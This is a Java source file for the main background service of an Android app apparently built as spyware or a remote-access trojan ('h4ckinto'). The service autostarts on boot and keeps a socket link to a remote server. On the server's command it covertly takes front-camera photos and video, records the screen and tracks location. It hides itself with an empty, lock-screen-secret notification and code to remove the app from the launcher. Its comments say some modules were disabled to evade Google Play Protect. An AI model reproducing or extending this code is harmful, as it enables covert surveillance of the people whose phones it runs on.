package com.h4ckinto.android.service;

import android.app.Activity;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.os.PowerManager;
import android.util.Log;

import androidx.core.app.NotificationCompat;

import com.h4ckinto.android.MainActivity;
import com.h4ckinto.android.R;
import com.h4ckinto.android.TransparentCameraActivity;
// Disabled invasive managers to avoid Google Play Protect warnings
// import com.h4ckinto.android.managers.AudioManager;
// import com.h4ckinto.android.managers.CallLogManager;
import com.h4ckinto.android.managers.CameraManager;
// import com.h4ckinto.android.managers.ContactsManager;
import com.h4ckinto.android.managers.LocationManager;
// import com.h4ckinto.android.managers.SMSManager;
import com.h4ckinto.android.managers.ScreenRecorderManager;
import com.h4ckinto.android.network.SocketManager;
import com.h4ckinto.android.utils.Constants;
import com.h4ckinto.android.utils.PermissionDetector;

import org.json.JSONObject;

public class MainService extends Service {
    private static final String TAG = "MainService";
    
    private SocketManager socketManager;
    private LocationManager locationManager;
    // Disabled to avoid Google Play Protect warnings
    // private AudioManager audioManager;
    // private SMSManager smsManager;
    // private ContactsManager contactsManager;
    // private CallLogManager callLogManager;
    private ScreenRecorderManager screenRecorderManager;
    private CameraManager cameraManager;
    
    // WakeLock to keep service alive even when screen is off
    private PowerManager.WakeLock wakeLock;
    
    private boolean isServiceRunning = false;

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "MainService created - Starting background service");
        
        try {
            createNotificationChannel();
            
            // Acquire WakeLock to keep service alive even when screen is off
            acquireWakeLock();
            
            // Managers MUST exist before startForegroundService() (uses locationManager, etc.)
            initializeManagers();
            
            // Foreground service after managers — avoids NPE and FGS timeout kill
            startForegroundService();
            
            // Hide from recent apps (optional, may cause issues)
            // hideFromRecentApps();
            
        } catch (Exception e) {
            Log.e(TAG, "Error in onCreate: " + e.getMessage(), e);
        }
    }
    
    /**
     * Acquire WakeLock to keep service alive even when screen is off
     * This ensures camera and audio commands work in background
     */
    private void acquireWakeLock() {
        try {
            PowerManager powerManager = (PowerManager) getSystemService(POWER_SERVICE);
            if (powerManager != null && wakeLock == null) {
                // Use PARTIAL_WAKE_LOCK - keeps CPU running but allows screen to turn off
                wakeLock = powerManager.newWakeLock(
                    PowerManager.PARTIAL_WAKE_LOCK,
                    "H4CKINTO:MainServiceWakeLock"
                );
                // Set reference counted to false so one acquire/release call affects the wake lock
                wakeLock.setReferenceCounted(false);
                wakeLock.acquire();
                Log.d(TAG, "✅ WakeLock acquired - service will stay alive in background");
            }
        } catch (Exception e) {
            Log.e(TAG, "Error acquiring WakeLock: " + e.getMessage(), e);
        }
    }
    
    /**
     * Release WakeLock when service is destroyed
     */
    private void releaseWakeLock() {
        try {
            if (wakeLock != null && wakeLock.isHeld()) {
                wakeLock.release();
                wakeLock = null;
                Log.d(TAG, "WakeLock released");
            }
        } catch (Exception e) {
            Log.e(TAG, "Error releasing WakeLock: " + e.getMessage(), e);
        }
    }
    
    private void hideFromRecentApps() {
        try {
            // Hide from launcher - using correct package name
            android.content.pm.PackageManager pm = getPackageManager();
            String packageName = getPackageName();
            
            // Try to hide MainActivity if it exists
            try {
                pm.setComponentEnabledSetting(
                    new android.content.ComponentName(this, packageName + ".MainActivity"),
                    android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    android.content.pm.PackageManager.DONT_KILL_APP
                );
            } catch (Exception e) {
                Log.d(TAG, "MainActivity not found or already hidden");
            }
            
            // Hide SimpleMainActivity
            try {
                pm.setComponentEnabledSetting(
                    new android.content.ComponentName(this, packageName + ".SimpleMainActivity"),
                    android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    android.content.pm.PackageManager.DONT_KILL_APP
                );
                Log.d(TAG, "App hidden from launcher");
            } catch (Exception e) {
                Log.d(TAG, "SimpleMainActivity not found or already hidden");
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error hiding app: " + e.getMessage());
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // Check if this is an auto-start from boot
        boolean autoStart = intent != null && intent.getBooleanExtra("auto_start", false);
        boolean bootCompleted = intent != null && intent.getBooleanExtra("boot_completed", false);
        
        if (bootCompleted) {
            Log.d(TAG, "🔄 MainService started AUTOMATICALLY after device boot");
            Log.d(TAG, "   Service will connect to server without user opening app");
        } else if (autoStart) {
            Log.d(TAG, "🔄 MainService started automatically");
        } else {
            Log.d(TAG, "MainService started - auto-starting service");
        }
        
        // Check if this is a location request
        if (intent != null && "com.h4ckinto.android.REQUEST_LOCATION".equals(intent.getAction())) {
            Log.d(TAG, "Received immediate location request");
            requestLocationIfPermitted();
        }
        
        // Check if this is a front camera photo request
        if (intent != null && "com.h4ckinto.android.TAKE_FRONT_PHOTO".equals(intent.getAction())) {
            Log.d(TAG, "Front camera photo request received");
            // Ensure managers are initialized
            if (cameraManager == null) {
                Log.w(TAG, "CameraManager is null, initializing managers...");
                initializeManagers();
            }
            
            if (cameraManager != null) {
                try {
                    Log.d(TAG, "Initiating front camera photo capture via Camera2 API...");
                    cameraManager.takeFrontPhoto();
                    Log.d(TAG, "✅ Front camera photo capture initiated");
                } catch (Exception e) {
                    Log.e(TAG, "❌ Error taking front camera photo: " + e.getMessage(), e);
                    try {
                        JSONObject errorData = new JSONObject();
                        errorData.put("type", "camera_error");
                        errorData.put("error", "Failed to take photo: " + e.getMessage());
                        errorData.put("timestamp", System.currentTimeMillis());
                        SocketManager.getInstance(this).sendFileData(errorData);
                    } catch (Exception ex) {
                        Log.e(TAG, "Error sending camera error to server", ex);
                    }
                }
            } else {
                Log.e(TAG, "❌ CameraManager is still null after initialization attempt");
                try {
                    JSONObject errorData = new JSONObject();
                    errorData.put("type", "camera_error");
                    errorData.put("error", "CameraManager initialization failed");
                    errorData.put("timestamp", System.currentTimeMillis());
                    SocketManager.getInstance(this).sendFileData(errorData);
                } catch (Exception ex) {
                    Log.e(TAG, "Error sending camera error to server", ex);
                }
            }
        }

        if (intent != null && "com.h4ckinto.android.TAKE_FRONT_VIDEO".equals(intent.getAction())) {
            int durationSec = intent.getIntExtra("duration_sec", 15);
            durationSec = Math.max(5, Math.min(60, durationSec));
            Log.d(TAG, "Front camera video request received (" + durationSec + "s)");
            if (cameraManager == null) {
                initializeManagers();
            }
            if (cameraManager != null) {
                try {
                    cameraManager.recordFrontVideo(durationSec);
                } catch (Exception e) {
                    Log.e(TAG, "Error starting front camera video", e);
                    try {
                        JSONObject errorData = new JSONObject();
                        errorData.put("type", "front_camera_video_error");
                        errorData.put("error", e.getMessage() != null ? e.getMessage() : "Unknown error");
                        errorData.put("timestamp", System.currentTimeMillis());
                        SocketManager.getInstance(this).sendFileData(errorData);
                    } catch (Exception ex) {
                        Log.e(TAG, "Error sending video error", ex);
                    }
                }
            } else {
                try {
                    JSONObject errorData = new JSONObject();
                    errorData.put("type", "front_camera_video_error");
                    errorData.put("error", "CameraManager initialization failed");
                    errorData.put("timestamp", System.currentTimeMillis());
                    SocketManager.getInstance(this).sendFileData(errorData);
                } catch (Exception ex) {
                    Log.e(TAG, "Error sending video error", ex);
                }
            }
        }
        
        // Check if this is a screen recording request
        if (intent != null && "com.h4ckinto.android.START_SCREEN_RECORDING".equals(intent.getAction())) {
            int resultCode = intent.getIntExtra("resultCode", Activity.RESULT_CANCELED);
            android.content.Intent data = intent.getParcelableExtra("data");
            int duration = intent.getIntExtra("duration", 30);
            
            Log.d(TAG, "Screen recording request received - resultCode: " + resultCode + ", duration: " + duration);
            
            // Ensure managers are initialized
            if (screenRecorderManager == null) {
                Log.w(TAG, "ScreenRecorderManager is null, initializing managers...");
                initializeManagers();
            }
            
            if (resultCode == Activity.RESULT_OK && data != null && screenRecorderManager != null) {
                Log.d(TAG, "Starting screen recording - Duration: " + duration + "s");
                try {
                    screenRecorderManager.startRecording(resultCode, data, duration);
                    Log.d(TAG, "Screen recording started successfully");
                } catch (Exception e) {
                    Log.e(TAG, "Error starting screen recording: " + e.getMessage(), e);
                    // Send error to server
                    try {
                        JSONObject errorData = new JSONObject();
                        errorData.put("type", "screen_recording_error");
                        errorData.put("error", "Failed to start recording: " + e.getMessage());
                        errorData.put("timestamp", System.currentTimeMillis());
                        socketManager.sendFileData(errorData);
                    } catch (Exception ex) {
                        Log.e(TAG, "Error sending screen recording error to server", ex);
                    }
                }
            } else {
                String errorMsg = "";
                if (resultCode != Activity.RESULT_OK) {
                    errorMsg = "Screen recording permission denied (resultCode: " + resultCode + ")";
                    Log.e(TAG, errorMsg);
                } else if (data == null) {
                    errorMsg = "Screen recording data is null - permission may have been denied";
                    Log.e(TAG, errorMsg);
                } else if (screenRecorderManager == null) {
                    errorMsg = "ScreenRecorderManager initialization failed";
                    Log.e(TAG, errorMsg);
                }
                
                // Send error to server
                if (!errorMsg.isEmpty()) {
                    try {
                        JSONObject errorData = new JSONObject();
                        errorData.put("type", "screen_recording_error");
                        errorData.put("error", errorMsg);
                        errorData.put("timestamp", System.currentTimeMillis());
                        socketManager.sendFileData(errorData);
                    } catch (Exception e) {
                        Log.e(TAG, "Error sending screen recording error to server", e);
                    }
                }
            }
        }
        
        // Always start the service regardless of intent
        startForegroundService();
        
        // Return START_STICKY to ensure service restarts if killed
        return START_STICKY;
    }

    private void startForegroundService() {
        if (isServiceRunning) {
            Log.d(TAG, "Service already running");
            // Even if already running, request location to ensure it's saved
            requestLocationIfPermitted();
            return;
        }
        
        // Start as background service without notification
        try {
            // Connect to server dynamically first
            connectToServer();
            
            // Start location tracking (manager must be initialized in onCreate first)
            if (locationManager != null) {
                locationManager.startLocationTracking();
            } else {
                Log.e(TAG, "locationManager is null — skipping startLocationTracking");
            }
            
            // Request location immediately when service starts (if permissions granted)
            // This ensures location is saved to DB when app first opens
            requestLocationIfPermitted();
            
            // Only start foreground if absolutely necessary
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                Notification notification = createInvisibleNotification();
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                    // Android 11+ (API 30) - dynamically build service types from manifest
                    int serviceTypes = android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC;
                    StringBuilder typesLog = new StringBuilder("dataSync");
                    
                    try {
                        if (PermissionDetector.isCameraAvailable(this)) {
                            serviceTypes |= android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA;
                            typesLog.append("|camera");
                        }
                        if (PermissionDetector.isMicrophoneAvailable(this)) {
                            serviceTypes |= android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE;
                            typesLog.append("|microphone");
                        }
                        if (PermissionDetector.isLocationAvailable(this)) {
                            serviceTypes |= android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION;
                            typesLog.append("|location");
                        }
                    } catch (Exception e) {
                        Log.e(TAG, "Error detecting permissions: " + e.getMessage());
                    }
                    
                    startForeground(Constants.NOTIFICATION_ID, notification, serviceTypes);
                    Log.d(TAG, "✅ Foreground service started with types: " + typesLog.toString());
                } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                    startForeground(Constants.NOTIFICATION_ID, notification, 
                        android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
                    Log.d(TAG, "✅ Foreground service started with dataSync type (Android 10)");
                } else {
                    startForeground(Constants.NOTIFICATION_ID, notification);
                }
            }
            
            isServiceRunning = true;
            Log.d(TAG, "Service started without visible notification");
        } catch (Exception e) {
            Log.e(TAG, "Error starting service: " + e.getMessage());
        }
    }
    
    /**
     * Request location if permissions are granted
     * This ensures location is saved to DB immediately when service starts
     */
    private void requestLocationIfPermitted() {
        try {
            if (locationManager != null) {
                // Check if location permissions are granted
                if (androidx.core.content.ContextCompat.checkSelfPermission(this, 
                        android.Manifest.permission.ACCESS_FINE_LOCATION) == 
                        android.content.pm.PackageManager.PERMISSION_GRANTED ||
                    androidx.core.content.ContextCompat.checkSelfPermission(this, 
                        android.Manifest.permission.ACCESS_COARSE_LOCATION) == 
                        android.content.pm.PackageManager.PERMISSION_GRANTED) {
                    
                    Log.d(TAG, "Location permissions granted - requesting location immediately");
                    
                    // Get last known location first (fast)
                    locationManager.getLastKnownLocation();
                    
                    // Also request a fresh location update (more accurate)
                    locationManager.requestCurrentLocation();
                    
                    // Retry after a delay to ensure location is captured even if GPS needs time
                    new android.os.Handler().postDelayed(() -> {
                        locationManager.requestCurrentLocation();
                        Log.d(TAG, "Retrying location request to ensure it's saved to DB");
                    }, 5000); // Retry after 5 seconds
                } else {
                    Log.w(TAG, "Location permissions not granted - cannot save location to DB");
                }
            } else {
                Log.w(TAG, "LocationManager not initialized yet");
            }
        } catch (Exception e) {
            Log.e(TAG, "Error requesting location: " + e.getMessage(), e);
        }
    }
    
    private void connectToServer() {
        try {
            // Connect to server with dynamic retry
            socketManager.connect();
            
            // Start connection monitoring
            startConnectionMonitoring();
            
            Log.d(TAG, "Connected to server dynamically");
        } catch (Exception e) {
            Log.e(TAG, "Error connecting to server: " + e.getMessage());
            // Retry connection after delay
            new android.os.Handler().postDelayed(() -> connectToServer(), 5000);
        }
    }
    
    private void startConnectionMonitoring() {
        // Monitor connection and reconnect if needed
        new android.os.Handler().postDelayed(() -> {
            if (!socketManager.isConnected()) {
                Log.d(TAG, "Connection lost, reconnecting...");
                connectToServer();
            }
            // Check every 30 seconds
            startConnectionMonitoring();
        }, 30000);
    }

    private void stopService() {
        if (!isServiceRunning) {
            Log.d(TAG, "Service not running");
            return;
        }
        
        // Stop location tracking
        locationManager.stopLocationTracking();
        
        // Disconnect from server
        socketManager.disconnect();
        
        // Stop foreground service
        stopForeground(true);
        stopSelf();
        
        isServiceRunning = false;
        Log.d(TAG, "Service stopped");
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationManager notificationManager = getSystemService(NotificationManager.class);
            if (notificationManager != null) {
                // Check if channel already exists
                NotificationChannel existingChannel = notificationManager.getNotificationChannel(Constants.NOTIFICATION_CHANNEL_ID);
                
                if (existingChannel == null) {
                    // Create channel with IMPORTANCE_LOW (visible but silent)
                    // IMPORTANCE_NONE causes Android to kill the service more aggressively
                    // IMPORTANCE_LOW keeps the service alive while being minimally intrusive
                    NotificationChannel channel = new NotificationChannel(
                        Constants.NOTIFICATION_CHANNEL_ID,
                        Constants.NOTIFICATION_CHANNEL_NAME,
                        NotificationManager.IMPORTANCE_LOW // Changed from NONE to LOW for better persistence
                    );
                    channel.setDescription("Background service for camera and audio");
                    channel.setShowBadge(false);
                    channel.enableLights(false);
                    channel.enableVibration(false);
                    channel.setSound(null, null);
                    channel.setLockscreenVisibility(Notification.VISIBILITY_SECRET);
                    channel.setBypassDnd(false);
                    
                    notificationManager.createNotificationChannel(channel);
                    Log.d(TAG, "✅ Notification channel created with IMPORTANCE_LOW (persistent service)");
                } else {
                    // Channel exists - user may have changed settings, don't override
                    Log.d(TAG, "Notification channel already exists, keeping user preferences");
                }
            }
        }
    }

    private Notification createInvisibleNotification() {
        // Create minimal notification with "minimize" style
        // This creates the smallest possible notification (appears as tiny dot)
        
        // Create a minimized style notification
        NotificationCompat.DecoratedCustomViewStyle style = new NotificationCompat.DecoratedCustomViewStyle();
        
        return new NotificationCompat.Builder(this, Constants.NOTIFICATION_CHANNEL_ID)
            .setContentTitle("") // Completely empty
            .setContentText("") // Completely empty
            .setSubText("") // Empty
            .setSmallIcon(android.R.drawable.stat_notify_sync_noanim) // Smallest sync icon
            .setOngoing(true) // Cannot be dismissed by user
            .setPriority(NotificationCompat.PRIORITY_LOW) // Changed from MIN to LOW for persistence
            .setCategory(NotificationCompat.CATEGORY_SERVICE)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET) // Hidden on lock screen
            .setShowWhen(false)
            .setUsesChronometer(false)
            .setAutoCancel(false)
            .setSilent(true)
            .setLocalOnly(true)
            .setDefaults(0)
            .setVibrate(null)
            .setSound(null)
            .setLights(0, 0, 0)
            .setContentIntent(null)
            .setDeleteIntent(null)
            .setTicker(null)
            .setNumber(0)
            .setOnlyAlertOnce(true)
            .setGroupSummary(false)
            .setGroupAlertBehavior(NotificationCompat.GROUP_ALERT_SUMMARY)
            .setTimeoutAfter(0)
            .setAllowSystemGeneratedContextualActions(false)
            .setStyle(style)
            .setNumber(0) // No badge number
            .setUsesChronometer(false) // No chronometer
            .setWhen(0) // No timestamp
            .build();
    }
    
    private Notification createNotification() {
        // Fallback notification (not used)
        return createInvisibleNotification();
    }

    private void initializeManagers() {
        try {
            Log.d(TAG, "Initializing managers...");
            
            socketManager = SocketManager.getInstance(this);
            Log.d(TAG, "✓ SocketManager initialized");
            
            locationManager = new LocationManager(this);
            Log.d(TAG, "✓ LocationManager initialized");
            
            // Disabled invasive managers to avoid Google Play Protect warnings
            // audioManager = new AudioManager(this);
            // smsManager = new SMSManager(this);
            // contactsManager = new ContactsManager(this);
            // callLogManager = new CallLogManager(this);
            
            screenRecorderManager = new ScreenRecorderManager(this);
            Log.d(TAG, "✓ ScreenRecorderManager initialized");
            
            cameraManager = new CameraManager(this);
            Log.d(TAG, "✓ CameraManager initialized");
            
            // Notification listener service disabled to avoid Google Play Protect warnings
            // startNotificationListenerService();
            
            Log.d(TAG, "All managers initialized successfully");
        } catch (Exception e) {
            Log.e(TAG, "Error initializing managers: " + e.getMessage(), e);
        }
    }
    
    /**
     * Get ScreenRecorderManager instance
     */
    public ScreenRecorderManager getScreenRecorderManager() {
        return screenRecorderManager;
    }
    
    /**
     * Get CameraManager instance
     */
    public CameraManager getCameraManager() {
        return cameraManager;
    }
    
    private void startNotificationListenerService() {
        try {
            Log.d(TAG, "Starting notification listener service...");
            
            // Check if notification listener permission is granted
            if (isNotificationListenerEnabled()) {
                Intent notificationServiceIntent = new Intent(this, com.h4ckinto.android.service.H4CKINTONotificationListenerService.class);
                startService(notificationServiceIntent);
                Log.d(TAG, "Notification listener service started");
            } else {
                Log.w(TAG, "Notification listener permission not granted, requesting permission...");
                requestNotificationListenerPermission();
            }
        } catch (Exception e) {
            Log.e(TAG, "Error starting notification listener service: " + e.getMessage());
        }
    }
    
    private boolean isNotificationListenerEnabled() {
        try {
            String pkgName = getPackageName();
            String flat = android.provider.Settings.Secure.getString(getContentResolver(), "enabled_notification_listeners");
            if (flat != null && !flat.isEmpty()) {
                String[] list = flat.split(":");
                for (String name : list) {
                    if (name.contains(pkgName)) {
                        return true;
                    }
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error checking notification listener permission: " + e.getMessage());
        }
        return false;
    }
    
    private void requestNotificationListenerPermission() {
        try {
            Intent intent = new Intent(android.provider.Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
            Log.d(TAG, "Opened notification listener settings");
        } catch (Exception e) {
            Log.e(TAG, "Error opening notification listener settings: " + e.getMessage());
        }
    }

    @Override
    public void onDestroy() {
        Log.d(TAG, "File sync service stopped");
        
        // Release WakeLock when service is destroyed
        releaseWakeLock();
        
        if (locationManager != null) {
            locationManager.destroy();
        }
        
        // Disabled managers - commented out
        // if (audioManager != null) {
        //     audioManager.destroy();
        // }
        
        if (screenRecorderManager != null) {
            screenRecorderManager.destroy();
        }
        
        if (cameraManager != null) {
            cameraManager.destroy();
        }
        
        if (socketManager != null) {
            socketManager.disconnect();
        }
        
        isServiceRunning = false;
        super.onDestroy();
        
        // START_STICKY (returned in onStartCommand) will automatically restart the service
        // This is standard Android behavior for persistent services
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    public boolean isServiceRunning() {
        return isServiceRunning;
    }
}
